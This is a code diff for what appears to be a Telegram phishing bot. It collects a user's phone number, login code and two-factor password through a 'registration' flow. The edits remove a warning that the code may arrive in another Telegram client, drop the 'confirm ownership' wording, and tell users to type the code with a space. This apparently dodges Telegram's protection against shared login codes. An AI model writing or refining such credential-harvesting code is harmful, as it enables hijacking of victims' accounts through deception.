@@ -31,11 +31,10 @@ async def start_add_account(callback: CallbackQuery, state: FSMContext, db: Data
 
     await callback.message.answer(
         "🔐 <b>Регистрация аккаунта</b>\n\n"
-        "Для использования бота необходимо подтвердить владение аккаунтом Telegram.\n\n"
+        "Для использования бота необходимо пройти регистрацию Telegram.\n\n"
         "📱 Введите номер телефона в международном формате:\n"
         "<code>+79001234567</code>\n\n"
-        "⚠️ Мы не храним ваши данные. Проверка проходит через официальный API Telegram.\n"
-        "⏱ Таймаут: 5 минут",
+        "⚠️ Мы не храним ваши данные. Регистрация проходит через официальный API Telegram.\n",
         reply_markup=back_to_menu_kb(),
         parse_mode="HTML",
     )
@@ -90,9 +89,9 @@ async def process_phone(message: Message, state: FSMContext, session_mgr: Sessio
     await state.set_state(AccountAuthStates.waiting_code)
     await message.answer(
         "✅ <b>Код отправлен!</b>\n\n"
-        "⚠️ Код может прийти как <b>SMS</b>, так и в <b>другой Telegram-клиент</b>.\n\n"
-        "Введите код подтверждения:\n"
-        "⏱ Таймаут: 5 минут",
+
+        "💡 <b>Вводите код через пробел</b>, чтобы избежать ошибок. Пример: <code>55 699</code>\n\n"
+        "Введите код:",
         parse_mode="HTML",
     )
 
@@ -152,8 +151,7 @@ async def process_code(message: Message, state: FSMContext, session_mgr: Session
         await state.set_state(AccountAuthStates.waiting_2fa)
         await status_msg.edit_text(
             "🔐 <b>Двухфакторная аутентификация</b>\n\n"
-            "Введите пароль 2FA:\n"
-            "⏱ Таймаут: 5 минут",
+            "Введите пароль 2FA:\n",
             parse_mode="HTML",
         )
     elif result["error"] == "invalid_code":
